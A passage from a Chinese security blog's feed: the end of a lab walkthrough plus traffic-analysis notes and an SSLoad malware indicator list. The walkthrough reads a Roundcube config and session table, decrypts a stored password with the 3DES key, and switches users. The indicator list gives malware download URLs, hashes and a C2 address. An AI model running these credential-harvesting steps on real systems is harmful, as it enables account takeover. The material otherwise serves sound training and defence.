class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">su tyler</span><br><span class="line"><span class="comment"># 看看能不能创建交互式命令行</span></span><br><span class="line"><span class="built_in">which</span> python3</span><br><span class="line"><span class="built_in">which</span> python</span><br><span class="line"><span class="comment"># 都没有显示，那就不行了，如果有其他方法，我也不知道</span></span><br><span class="line"><span class="comment"># 进入home看看有几个用户</span></span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..</span><br><span class="line">drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob</span><br><span class="line">drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel</span><br><span class="line">drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler</span><br><span class="line"><span class="comment"># 在tyler里面看一圈，好像也没啥东西，再看看有啥能执行，发现不行</span></span><br><span class="line">sudo -l</span><br><span class="line">bash: line 25: sudo: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line"><span class="comment"># 那就去网页的地方看看</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root     root     4096 Jun  6 18:55 .</span><br><span class="line">drwxr-xr-x 1 root     root     4096 Jun  6 18:55 ..</span><br><span class="line">-rw-r--r-- 1 root     root      615 Jun  6 18:55 index.nginx-debian.html</span><br><span class="line">drwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 roundcube</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进到roundcube看看</span></span><br><span class="line"><span class="built_in">cd</span> roundcube</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 412</span><br><span class="line">drwxr-xr-x  1 www-data www-data   4096 Jun  6 18:55 .</span><br><span class="line">drwxr-xr-x  1 root     root       4096 Jun  6 18:55 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data   2553 Feb  8  2025 .htaccess</span><br><span class="line">-rw-r--r--  1 www-data www-data 216244 Feb  8  2025 CHANGELOG.md</span><br><span class="line">-rw-r--r--  1 www-data www-data  12714 Feb  8  2025 INSTALL</span><br><span class="line">-rw-r--r--  1 www-data www-data  35147 Feb  8  2025 LICENSE</span><br><span class="line">-rw-r--r--  1 www-data www-data   3853 Feb  8  2025 README.md</span><br><span class="line">-rw-r--r--  1 www-data www-data   1049 Feb  8  2025 SECURITY.md</span><br><span class="line">drwxr-xr-x  7 www-data www-data   4096 Feb  8  2025 SQL</span><br><span class="line">-rw-r--r--  1 www-data www-data   4657 Feb  8  2025 UPGRADING</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  8  2025 bin</span><br><span class="line">-rw-r--r--  1 www-data www-data   1086 Feb  8  2025 composer.json</span><br><span class="line">-rw-r--r--  1 www-data www-data  56802 Feb  8  2025 composer.lock</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Jun  6 18:55 config</span><br><span class="line">-rw-r--r--  1 www-data www-data  11200 Feb  8  2025 index.php</span><br><span class="line">drwxr-xr-x  1 www-data www-data   4096 Jun 11 07:46 logs</span><br><span class="line">drwxr-xr-x 37 www-data www-data   4096 Feb  8  2025 plugins</span><br><span class="line">drwxr-xr-x  8 www-data www-data   4096 Feb  8  2025 program</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Jun  6 18:55 public_html</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Feb  8  2025 skins</span><br><span class="line">drwxr-xr-x  1 www-data www-data   4096 Aug 13 01:40 temp</span><br><span class="line">drwxr-xr-x 14 www-data www-data   4096 Feb  8  2025 vendor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看到有个config，看看去</span></span><br><span class="line"><span class="built_in">cd</span> config</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 92</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  6 18:55 .</span><br><span class="line">drwxr-xr-x 1 www-data www-data  4096 Jun  6 18:55 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data   164 Feb  8  2025 .htaccess</span><br><span class="line">-rw-r--r-- 1 root     root      3024 Jun  6 18:55 config.inc.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data  2943 Feb  8  2025 config.inc.php.sample</span><br><span class="line">-rw-r--r-- 1 www-data www-data 65000 Feb  8  2025 defaults.inc.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data  2806 Feb  8  2025 mimetypes.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看吧，一个一个的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> config.inc.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把内容直接甩给<code>gpt</code>，人家都说的很明白了。<br><img src="/../images/3dbe5a181fa9d4c7e591c43d880f9b4f84a57bfd6bc46fcc8dbe8a62e086a3dc.png" alt="picture 4"> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为没有交互式终端 只能连接同时执行数据库命令</span></span><br><span class="line">mysql -u roundcube -p<span class="string">&#x27;RCDBPass2025&#x27;</span> -h localhost roundcube -e <span class="string">&quot;SHOW TABLES;&quot;</span></span><br><span class="line">Tables_in_roundcube</span><br><span class="line">cache</span><br><span class="line">cache_index</span><br><span class="line">cache_messages</span><br><span class="line">cache_shared</span><br><span class="line">cache_thread</span><br><span class="line">collected_addresses</span><br><span class="line">contactgroupmembers</span><br><span class="line">contactgroups</span><br><span class="line">contacts</span><br><span class="line">dictionary</span><br><span class="line">filestore</span><br><span class="line">identities</span><br><span class="line">responses</span><br><span class="line">searches</span><br><span class="line">session</span><br><span class="line">system</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看看users吧，里面三个用户，也没有密码</span></span><br><span class="line">mysql -u roundcube -p<span class="string">&#x27;RCDBPass2025&#x27;</span> -h localhost roundcube -e <span class="string">&quot;SELECT * FROM users;&quot;</span></span><br><span class="line"><span class="comment"># 看看session</span></span><br><span class="line"></span><br><span class="line">mysql -u roundcube -p<span class="string">&#x27;RCDBPass2025&#x27;</span> -h localhost roundcube -e <span class="string">&quot;SELECT * FROM session;&quot;</span></span><br></pre></td></tr></table></figure><p>有一串类似<code>base64</code>的字符串。<br><img src="/../images/856537f677c78dd8327e4e763487cc6be8b605ce40956ff3415813c9be9d218d.png" alt="picture 5"><br><code>CyberChef</code>来解一下，看到密码了，解一下，解不开，前面说用了<code>DES</code>加密，问问聪明的<code>gpt</code>。<br><img src="/../images/46de738abceca77126c34978643dea1476bfed9f7bc748b4226a36698b5a4670.png" alt="picture 6">  </p><p>聪明的<code>gpt</code>说这个用的是3DES，那就试试呗，先把密码转成<code>HEX</code></p><p><img src="/../images/70225a4c3c815508e4ea5bd567e315c60f3c09df28cebe17718f244a7165ae98.png" alt="picture 7">  </p><p><code>key</code>就是<code>rcmail-!24ByteDESkey*Str</code>，不知道IV是什么。问问聪明的<code>gpt</code>。</p><p><img src="/../images/e1807f09a32ec0ffd049129f0fc83de05032e593c2d27879e1ff8a0c2152079f.png" alt="picture 8">  </p><p>他说<br><code>具体流程是这样的（以旧版 3DES/rcube_crypto 为例）： 当 Roundcube 用 des_key 加密 IMAP 密码时，会随机生成一个 8 字节的 IV。 它把这个 IV 放在密文的前 8 个字节，然后再 Base64 编码。</code><br>那就取前8个字节呗。解出来是<code>595mO8DmwGeD</code></p><p><img src="/../images/22f25d24f9043c1f5e1e16df5ad54be84ca370f0e27e621d838003cca28a0bb8.png" alt="picture 9">  </p><p>那就试试呗，切换下用户<code>jacob</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">su jacob</span><br><span class="line">Password: 595mO8DmwGeD</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">jacob</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进去home看看</span></span><br><span class="line"><span class="built_in">cd</span> /home/jacob</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Jun  8 12:05 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Jun  6 19:03 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 jacob jacob  220 Mar 31  2024 .bash_logout</span><br><span class="line">-rw-r--r-- 1 jacob jacob 3771 Mar 31  2024 .bashrc</span><br><span class="line">-rw-r--r-- 1 jacob jacob  807 Mar 31  2024 .profile</span><br><span class="line">drwx------ 1 jacob jacob 4096 Jul  9 12:41 mail</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有个<code>mail</code> 看看，发现密码了，<code>ssh</code>一下试试<br><img src="/../images/94032946da4166a9df85e1a0345bea53f025be8c8a3a130080136d9afeae3dd0.png" alt="picture 10"><br>连接成功了，看看能不能提权到<code>root</code><br><img src="/../images/182711c3c70f1ac8c2a446b9799af8c684428973864fb4cdc70d958e65d0f497.png" alt="picture 11"><br><code>below</code>是<code>root</code>权限执行的，看看啥版本<br><img src="/../images/7540bbe4720402ab1a9386a04b820efbd3afb8a43213724908dc7c9af71ba6b5.png" alt="picture 12"><br><code>0.8 </code>看看有没有<code>CVE</code>，经过查询，真有<a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC">CVE-2025-27591</a><br><img src="/../images/3032c50af8c552f46ec8fb455fd85d8324a81c0780a2fa5014be3069c6a15765.png" alt="picture 13">  </p><p>按照给出的<code>POC</code>，验证成功</p><h2 id="又学到了T-T"><a href="#又学到了T-T" class="headerlink" title="又学到了T_T"></a>又学到了T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Outbound&quot;&gt;&lt;a href=&quot;#Outbound&quot; class=&quot;headerlink&quot; title=&quot;Outbound&quot;&gt;&lt;/a&gt;Outbound&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Finding Gozi - Unit 42 Wireshark Quiz, March 2023</title>
    <link href="https://2in9ya2.github.io/202303-Malware/"/>
    <id>https://2in9ya2.github.io/202303-Malware/</id>
    <published>2024-05-08T13:23:26.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unit-42-Wireshark-Quiz-March-2023"><a href="#Unit-42-Wireshark-Quiz-March-2023" class="headerlink" title="Unit 42 Wireshark Quiz, March 2023"></a>Unit 42 Wireshark Quiz, March 2023</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="请求流"><a href="#请求流" class="headerlink" title="请求流"></a>请求流</h3><p>首先看一下请求流都有啥东西<br><img src="/images/202303-Malware/image.png"><br>发现一个请求<br><img src="/images/202303-Malware/image-1.png"><br>追踪后其请求了<code>zip</code>文件<br><img src="/images/202303-Malware/image-2.png"></p><h3 id="ZIP文件分析"><a href="#ZIP文件分析" class="headerlink" title="ZIP文件分析"></a><code>ZIP</code>文件分析</h3><p>在虚拟机中将<code>zip</code>文件导出<br><img src="/images/202303-Malware/image-3.png"><br>其文件内包含了一个<code>URI</code>，该<code>URI</code>是以<code>file</code>为开头的，那么就会产生<code>SMB</code>流量<br><img src="/images/202303-Malware/image-4.png"></p><h3 id="SMB流量分析"><a href="#SMB流量分析" class="headerlink" title="SMB流量分析"></a><code>SMB</code>流量分析</h3><p>那就导出<code>SMB</code>流量传输的文件，发现文件并不是完全的，那就无法分析<br><img src="/images/202303-Malware/image-5.png"></p><h3 id="感染流量分析"><a href="#感染流量分析" class="headerlink" title="感染流量分析"></a>感染流量分析</h3><p>查看在请求<code>ZIP</code>文件之后的HTTP流量，发现其又请求了四个<code>rar</code>文件<br><img src="/images/202303-Malware/image-6.png"><br>流被加密，无法查看，且传输的是加密过的二进制文件<br><img src="/images/202303-Malware/image-7.png"></p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://unit42.paloaltonetworks.com/march-wireshark-gozi-answers/">Finding Gozi: Answers to Unit 42 Wireshark Quiz, March 2023</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Unit-42-Wireshark-Quiz-March-2023&quot;&gt;&lt;a href=&quot;#Unit-42-Wireshark-Quiz-March-2023&quot; class=&quot;headerlink&quot; title=&quot;Unit 42 Wireshark Quiz, March 2023&quot;&gt;&lt;/a&gt;Unit 42 Wireshark Quiz, March 2023&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Crossing the Line - Unit 42 Wireshark Quiz for RedLine Stealer</title>
    <link href="https://2in9ya2.github.io/202307-Malware/"/>
    <id>https://2in9ya2.github.io/202307-Malware/</id>
    <published>2024-04-28T02:16:20.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unit-42-Wireshark-Quiz-for-RedLine-Stealer"><a href="#Unit-42-Wireshark-Quiz-for-RedLine-Stealer" class="headerlink" title="Unit 42 Wireshark Quiz for RedLine Stealer"></a>Unit 42 Wireshark Quiz for RedLine Stealer</h1><span id="more"></span><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><p>查看主机名<br><img src="/images/202307-Malware/image-1.png"></p><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先查看<code>HTTP</code></p><p><img src="/images/202307-Malware/image.png"></p><p>发现没什么东西</p><p><img src="/images/202307-Malware/image-2.png"></p><h3 id="其他TCP"><a href="#其他TCP" class="headerlink" title="其他TCP"></a>其他TCP</h3><p>利用命令<code>tcp.flags eq 0x002 and !(tcp.port eq 443) and !(tcp.port eq 80) and !(ip.dst == 10.7.10.0/24)</code>查看目的地址非局域网的<code>SYN</code>包</p><p><img src="/images/202307-Malware/image-3.png"></p><p>发现C2服务器要求受害者主句提供各种类型的用户信息</p><p><img src="/images/202307-Malware/image-4.png"></p><p><img src="/images/202307-Malware/image-5.png"></p><p>还有一些其他的<code>KEY</code></p><p><img src="/images/202307-Malware/image-6.png"></p><p>受害者主机传输<code>png</code>图片</p><p><img src="/images/202307-Malware/image-7.png"></p><p>将数据下载，查看图片为</p><p><img src="/images/202307-Malware/image-8.png"></p><p>还传输了进程信息，主机配置，以及一些登录凭证<br><img src="/images/202307-Malware/image-9.png"></p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://unit42.paloaltonetworks.com/wireshark-quiz-redline-stealer-answers/">Crossing the Line: Unit 42 Wireshark Quiz for RedLine Stealer</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Unit-42-Wireshark-Quiz-for-RedLine-Stealer&quot;&gt;&lt;a href=&quot;#Unit-42-Wireshark-Quiz-for-RedLine-Stealer&quot; class=&quot;headerlink&quot; title=&quot;Unit 42 Wireshark Quiz for RedLine Stealer&quot;&gt;&lt;/a&gt;Unit 42 Wireshark Quiz for RedLine Stealer&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>OSINT</title>
    <link href="https://2in9ya2.github.io/OSINT/"/>
    <id>https://2in9ya2.github.io/OSINT/</id>
    <published>2024-04-20T06:09:55.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><span id="more"></span><h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><p><code>sublist3r</code>利用<code>OSINT</code>技术枚举主域名的所有子域名</p><p><img src="/images/OSINT/image.png"></p><p><code>Maltego</code>提取互联网上公开资料来收集个人信息</p><p><code>OSRFramework</code>用于执行开源情报计划的工具</p><ul><li><code>usufy</code>用于多搜索引擎搜索、识别<code>URL</code>中的关键字，并自动列举和<code>CSV</code>格式存储所有结果</li><li><code>mailfy</code>通过<code>API</code>调用在<code>havaibeenpawned.com</code>自动搜索</li><li><code>searchfy</code>在<code>Facebook</code>、<code>Github</code>、<code>Instagram</code>、<code>Twitter</code>和<code>Youtube</code>中搜索关键词</li><li><code>Passive Total</code>针对任何特定目标域名提供<code>OSINT</code>能力的另一个平台</li></ul><h2 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h2><ul><li><code>theHarvester</code>脚本，进行搜索</li></ul><p><img src="/images/OSINT/image-1.png"></p><h3 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h3><ul><li><code>TinEye</code>提供在线反向图像搜索门户网站</li><li><code>Shodan</code></li><li><code>SpiderFoot</code></li><li><code>Spyse</code></li><li><code>ZoomEye</code></li></ul><h3 id="Google-Hacking-数据库"><a href="#Google-Hacking-数据库" class="headerlink" title="Google Hacking 数据库"></a>Google Hacking 数据库</h3><h3 id="用户密码列表"><a href="#用户密码列表" class="headerlink" title="用户密码列表"></a>用户密码列表</h3><p><code>cupp</code>生成密码字典</p><h3 id="自定义密码破解字典"><a href="#自定义密码破解字典" class="headerlink" title="自定义密码破解字典"></a>自定义密码破解字典</h3><p><code>CeWL</code>给定<code>URL</code>进行指定深度的爬取，返回一个字典列表用于密码破解</p><p><code>twofi</code>从<code>Twitter</code>提取字典</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;OSINT&quot;&gt;&lt;a href=&quot;#OSINT&quot; class=&quot;headerlink&quot; title=&quot;OSINT&quot;&gt;&lt;/a&gt;OSINT&lt;/h1&gt;</summary>
    
    
    
    <category term="penetration_test" scheme="https://2in9ya2.github.io/categories/penetration-test/"/>
    
    
    <category term="study" scheme="https://2in9ya2.github.io/tags/study/"/>
    
    <category term="penetration test" scheme="https://2in9ya2.github.io/tags/penetration-test/"/>
    
  </entry>
  
  <entry>
    <title>CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11</title>
    <link href="https://2in9ya2.github.io/20240415-Malware/"/>
    <id>https://2in9ya2.github.io/20240415-Malware/</id>
    <published>2024-04-17T12:30:44.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11"><a href="#2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11" class="headerlink" title="2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11"></a>2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11</h1><span id="more"></span><p>该流量为感染流量</p><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="HTTP流"><a href="#HTTP流" class="headerlink" title="HTTP流"></a>HTTP流</h3><p>首先看到<code>HTTP</code>为主要流量，且<code>UA</code>为<code>SSLoad</code>也就是题目所提出的<code>SSLOAD</code>恶意软件，可以看出其向<code>HOST</code>为<code>85.239.53.219</code>发出请求，响应了<code>crypted_dll.bin</code>二进制文件<br><img src="/images/20240415-Malware/image.png"><br>随后受害主机便<code>POST</code>自身<code>IP</code>、域名、系统信息等<br><img src="/images/20240415-Malware/image-1.png"><br>随后又进行了一系列动作后，便保持连接<br><img src="/images/20240415-Malware/image-2.png"></p><p><img src="/images/20240415-Malware/image-3.png"></p><h3 id="原作者分析记录"><a href="#原作者分析记录" class="headerlink" title="原作者分析记录"></a>原作者分析记录</h3><p>INFECTION CHAIN:</p><ul><li>email generated by contact form of targeted organization’s website –&gt; URL from email –&gt; fake Azure page –&gt; Firebase URL –&gt; downloaded .js file –&gt; user double-clicks .js file, which is run by wscript.exe –&gt; downloads and runs .msi hosted on WebDAV server –&gt; .msi installs and runs SSLoad malware –&gt; SSLoad malware loads and runs encrypted payload –&gt; post-infection checkin traffic</li></ul><p>EXAMPLE OF URL FROM CONTACT FORM EMAIL SUBMITTED TO VIRUSTOTAL:</p><ul><li><a href="http://mmtixmm.org/65629679a60671570e93799683b05/case49308469q2097/court/out/367910732497/documents?t017538i87=0535008152&i=qz&dmc=www.scotchblue.com&4666842q3&cmp=horvitzlevy&4721702y0">http://mmtixmm.org/65629679a60671570e93799683b05/case49308469q2097/court/out/367910732497/documents?t017538i87=0535008152&amp;i=qz&amp;dmc=www.scotchblue.com&amp;4666842q3&amp;cmp=horvitzlevy&amp;4721702y0</a></li></ul><p>ASSOCIATED FAKE AZURE DOWNLOAD PAGE:</p><ul><li><a href="https://mebumau.org/?4666842q3&4721702y0&cmp=horvitzlevy&dmc=www.scotchblue.com&i=qz&t017538i87=0535008152">https://mebumau.org/?4666842q3&amp;4721702y0&amp;cmp=horvitzlevy&amp;dmc=www.scotchblue.com&amp;i=qz&amp;t017538i87=0535008152</a></li></ul><p>EXAMPLES OF FIREBASESTORAGE URLS FOR JS DOWNLOAD:</p><ul><li><p><a href="https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/I3Hl2Mxyqs%2FLetter_b23_98b161159-63t511248325-3676a8.js?alt=media&token=a097d607-7759-4aaa-b6e2-bfe5c43df76e">https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/I3Hl2Mxyqs%2FLetter_b23_98b161159-63t511248325-3676a8.js?alt=media&amp;token=a097d607-7759-4aaa-b6e2-bfe5c43df76e</a></p></li><li><p><a href="https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/VbxHHBQUee%2FLetter_u79_20w517865-65u0451500340-7186n6.js?alt=media&token=41e2b597-6b12-448a-92d1-9c770c818489">https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/VbxHHBQUee%2FLetter_u79_20w517865-65u0451500340-7186n6.js?alt=media&amp;token=41e2b597-6b12-448a-92d1-9c770c818489</a></p></li></ul><p>SHA256 EXAMPLES OF DOWNLOADED .JS FILES:</p><ul><li>93a215b08cce42249341816df7a85edac12d4bcef166b15da64bb238637f6e76  Letter_b23_98b161159-63t511248325-3676a8.js</li><li>5fb093a9348fcf4a81befda978c948796a8319fcabe7899c2cf5ba1419ec9d35  Letter_u79_20w517865-65u0451500340-7186n6.js</li></ul><p>ABOVE .JS FILES RETRIEVE MSI FILE FROM THE FOLLOWING URL:</p><ul><li>file:\globalsolutionunlimitedltd.com@80\share\sharepoint.msi</li></ul><p>DOWNLOADED MSI FILE:</p><ul><li>SHA256 hash: 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750</li><li>File size: 1,725,952 bytes</li><li>File location: file:\globalsolutionunlimitedltd.com@80\share\sharepoint.msi  &lt;– No longer online</li><li>Sample available at: <a href="https://bazaar.abuse.ch/sample/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750/">https://bazaar.abuse.ch/sample/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750/</a></li></ul><p>SSLOAD DLL INSTALLED AND RUN BY THE ABOVE MSI FILE:</p><ul><li>SHA256 hash: 09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c</li><li>File size: 718.848 bytes</li><li>File location: C:\Users[username]\AppData\Local\sharepoint\MenuEx.dll</li><li>Run method: regsvr32.exe &#x2F;s [filename]</li><li>Sample available at: <a href="https://bazaar.abuse.ch/sample/09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c/">https://bazaar.abuse.ch/sample/09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c/</a></li><li>Note: This malware is kept persistent by a scheduled task.</li></ul><p>POST-INFECTION TRAFFIC:</p><ul><li><a href="https://t.me/+st2YadnCIU1iNmQy">https://t.me/+st2YadnCIU1iNmQy</a></li><li>85.239.53.219 port 80 - 85.239.53.219 - GET &#x2F;api&#x2F;g  &lt;– encrypted payload</li><li>port 443 - api.ipify.org - HTTPS traffic</li><li>85.239.53.219 port 80 - 85.239.53.219 - POST &#x2F;api&#x2F;gateway HTTP&#x2F;1.1 , JSON (application&#x2F;json)</li><li>85.239.53.219 port 80 - 85.239.53.219 - POST &#x2F;api&#x2F;b0408631-d621-61e4-7035-f7d17fc50af8&#x2F;tasks HTTP&#x2F;1.1 </li><li>85.239.53.219 port 80 - 85.239.53.219 - GET &#x2F;download?id&#x3D;Cosmos&amp;module&#x3D;2&amp;filename&#x3D;None HTTP&#x2F;1.1</li></ul><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11&quot;&gt;&lt;a href=&quot;#2024-04-15-MONDAY-CONTACT-FORMS-CAMPAIGN-PUSHES-SSLOAD-MALWARE-AS-EARLY-AS-THURSDAY-2024-04-11&quot; class=&quot;headerlink&quot; title=&quot;2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11&quot;&gt;&lt;/a&gt;2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Post-exploitation attack</title>
    <link href="https://2in9ya2.github.io/Post-exploitation-attack-privilege-escalation/"/>
    <id>https://2in9ya2.github.io/Post-exploitation-attack-privilege-escalation/</id>
    <published>2024-04-15T09:04:23.000Z</published>
    <updated>2025-08-13T05:11:30.616Z</updated>
    
